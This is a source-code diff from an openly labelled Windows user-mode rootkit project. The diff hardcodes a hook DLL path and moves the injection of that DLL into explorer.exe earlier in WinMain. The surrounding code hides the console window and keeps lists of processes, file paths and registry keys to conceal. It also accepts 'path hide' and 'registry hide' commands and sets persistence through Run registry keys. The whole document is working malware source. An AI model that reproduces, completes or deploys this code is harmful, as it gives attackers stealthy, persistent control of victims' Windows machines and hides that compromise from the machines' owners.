@@ -11,6 +11,7 @@
 #include "multiDLLInjector.h"
 #include "newProcessMonitor.h"
 #include "persistence.h"
+#include "isProcessRunning.h"
 
 using namespace std;
 
@@ -23,6 +24,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     unordered_map<string, vector<string>> injectionMap;
     Serialitzator serialitzator("");
+
+    injectionMap["explorer.exe"] = { "S:\\MalwareDeveloped\\S12URootkit\\Bin\\fileHooks.dll" };
+    injectDlls(injectionMap);
 
     // Process
     vector<wchar_t*> processesToHide;
@@ -38,6 +42,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     vector<wstring> registryKeysToHide;
     wstring str3 = L"hide";
     registryKeysToHide.push_back(str3);
+
 
     serialitzator.serializeVectorWCharTPointer(processesToHide, L"processAgentMapped");
     serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
@@ -59,20 +64,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         newProcessListener();
     }
 
-    // - rootkit.exe path hide C:\\path\\to
+    // - rootkit.exe path hide C:\path\to
     if (argc == 4 && wcscmp(argv[1], L"path") == 0 && wcscmp(argv[2], L"hide") == 0) {
-        // - rootkit.exe path hide C:\\path\\to
         vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"pathMapped");
-
-        // convert wchar_t* to wstring
         wchar_t* path = argv[3];
         deserializedStrings.push_back(path);
         serialitzator.serializeVectorWString(deserializedStrings, L"pathMapped");
     }
 
-    // - rootkit.exe registry hide value/key name
+    // - rootkit.exe registry hide keyValue name
     if (argc == 4 && wcscmp(argv[1], L"registry") == 0 && wcscmp(argv[2], L"hide") == 0) {
-        // - rootkit.exe registry hide value/key name
         vector<wstring> deserializedStrings = serialitzator.deserializeWStringVector(L"registryMapped");
         wchar_t* key = argv[3];
         deserializedStrings.push_back(key);
@@ -82,8 +83,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         newProcessListener();
     }
 
-    injectionMap["explorer.exe"] = { PATH_DLL };
-    injectDlls(injectionMap);
     const char* exePath = findFilePath("UserModeR00tkit.exe");
     persistenceViaRunKeys(exePath);
     
